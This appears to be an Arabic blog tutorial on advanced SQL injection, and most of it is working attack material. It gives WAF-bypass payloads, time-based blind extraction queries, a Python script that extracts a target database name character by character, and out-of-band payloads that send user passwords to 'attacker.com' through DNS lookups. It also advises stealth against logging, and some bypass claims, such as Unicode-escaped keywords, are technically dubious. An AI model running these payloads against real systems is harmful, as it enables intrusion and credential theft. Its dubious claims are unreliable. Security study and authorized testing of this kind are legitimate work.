---
layout: blog
title: "SQL Injection: تقنيات متقدمة للتجاوز والاستغلال في بيئات الإنتاج المحصنة"
date: 2026-03-29T16:11:33Z
category: "تقنية"
excerpt: "تجاوزت هجمات SQL Injection مرحلة الاستغلال البسيط منذ سنوات. اليوم، نواجه Web Application Firewalls متطورة وآليات تصفية معقدة تتطلب تقنيات أكثر ذكاءً. في هذه المقالة، نستكشف أساليب متقدمة للتحايل على الحمايات واستخراج البيانات من أنظمة محصنة بشكل احترافي."
read_time: 8
tags: ["SQL Injection", "Web Application Security", "Penetration Testing", "WAF Bypass", "Offensive Security"]
slug: "advanced-sql-injection"
---

## فهم البيئة المستهدفة قبل الهجوم

قبل البدء بأي payload متقدم، تحتاج لرسم خريطة دقيقة للبيئة. معرفة نوع قاعدة البيانات (MySQL, PostgreSQL, MSSQL) أمر حاسم. استخدم تقنية Error-based fingerprinting عبر إثارة أخطاء مقصودة:

```sql
' AND 1=CAST(@@version AS int)--
```

هذا الـ payload يجبر قاعدة البيانات على الكشف عن نسختها في رسالة الخطأ. في PostgreSQL، جرّب:

```sql
' AND 1=CAST(version() AS int)--
```

الفكرة هنا ليست مجرد اكتشاف الثغرة، بل فهم البنية التحتية الكاملة. معرفة إصدار قاعدة البيانات تكشف لك الـ functions المتاحة والقيود الأمنية المطبقة افتراضياً.

## تجاوز WAF باستخدام Encoding Techniques

أنظمة WAF الحديثة تعتمد على Signature-based detection. التحايل عليها يتطلب تشويه الـ payload بطرق تبقيه فعالاً تقنياً لكن غير مرئي للفلاتر.

تقنية URL Encoding المتعدد الطبقات فعالة جداً:

```python
import urllib.parse

payload = "' OR 1=1--"
encoded_once = urllib.parse.quote(payload)
encoded_twice = urllib.parse.quote(encoded_once)
print(encoded_twice)  # %2527%2520OR%25201%253D1--
```

بعض الأنظمة تفك Encoding مرة واحدة فقط، بينما قاعدة البيانات تفكه مرتين. استخدم أيضاً Unicode encoding للكلمات المحجوبة:

```sql
' \u0055NION \u0053ELECT NULL--
```

أو استخدم case manipulation مع inline comments في MySQL:

```sql
' UnIoN/**/SeLeCt/**/NULL,NULL--
```

الـ WAF يبحث عن "UNION SELECT" بشكل مباشر، لكن قاعدة البيانات تتجاهل الـ comments وتنفذ الأمر.

## Time-based Blind SQL Injection للاستخراج الصامت

عندما لا يعرض التطبيق أي output مباشر، تصبح Time-based techniques سلاحك الوحيد. الفكرة: اطرح أسئلة boolean واجعل قاعدة البيانات "تجيب" عبر التأخير.

في MySQL، استخدم SLEEP():

```sql
' AND IF(SUBSTRING(database(),1,1)='a',SLEEP(5),0)--
```

إذا تأخر الرد 5 ثوان، الحرف الأول من اسم قاعدة البيانات هو 'a'. كرر العملية لكل حرف. في PostgreSQL:

```sql
' AND (SELECT CASE WHEN (SELECT SUBSTRING(current_database(),1,1))='a' THEN pg_sleep(5) ELSE pg_sleep(0) END)--
```

لأتمتة هذا، استخدم SQLMap مع خيار `--technique=T` أو اكتب سكريبت Python:

```python
import requests
import string
import time

url = "http://target.com/page?id=1"
result = ""

for position in range(1, 20):
    for char in string.ascii_lowercase + string.digits:
        payload = f"' AND IF(SUBSTRING(database(),{position},1)='{char}',SLEEP(3),0)--"
        start = time.time()
        requests.get(url + payload)
        elapsed = time.time() - start
        
        if elapsed > 2.5:
            result += char
            print(f"Found: {result}")
            break
```

## Second-order SQL Injection: الاستغلال المؤجل

هذه التقنية تتجاوز معظم أنظمة الحماية لأنها تعتمد على فصل زمني بين الـ injection والتنفيذ. تحقن payload في المرحلة الأولى (مثل التسجيل)، ثم يُنفذ لاحقاً في سياق مختلف.

مثال واقعي: عند التسجيل في موقع، أدخل في حقل الاسم:

```sql
admin'--
```

التطبيق قد ينظف الـ input هنا، لكن يحفظه في قاعدة البيانات. لاحقاً، عند عرض الملف الشخصي، قد يُبنى استعلام:

```sql
SELECT * FROM profiles WHERE username = 'admin'--' 
```

الـ payload نُفذ في سياق لم يتوقعه المطور. هذه التقنية تتطلب صبراً وفهماً عميقاً لتدفق البيانات في التطبيق.

## Out-of-band Data Exfiltration

عندما تفشل كل الطرق السابقة، استخدم DNS أو HTTP لتسريب البيانات. في MySQL مع صلاحيات LOAD_FILE:

```sql
' UNION SELECT LOAD_FILE(CONCAT('\\\\',(SELECT password FROM users LIMIT 1),'.attacker.com\\share'))--
```

هذا يجبر الخادم على إجراء DNS lookup لـ `[password].attacker.com`، وتلتقط أنت البيانات عبر DNS server تديره.

في MSSQL مع xp_dirtree:

```sql
'; EXEC master..xp_dirtree '\\'++(SELECT TOP 1 password FROM users)++'.attacker.com\share'--
```

راقب DNS logs على سيرفرك:

```bash
tcpdump -i eth0 -n port 53 | grep attacker.com
```

## الخلاصة العملية

النجاح في SQL Injection المتقدم يتطلب منهجية:

1. **Reconnaissance شامل**: افهم التقنية المستخدمة قبل أي محاولة
2. **Iterative testing**: جرّب تقنيات متعددة بشكل منهجي
3. **Automation ذكية**: استخدم أدوات لكن افهم ما تفعله
4. **Stealth**: تجنب الضجيج في Logs قدر الإمكان

تذكر: هذه التقنيات للـ Authorized Penetration Testing فقط. استخدامها بدون إذن يُعد جريمة في معظم الدول.
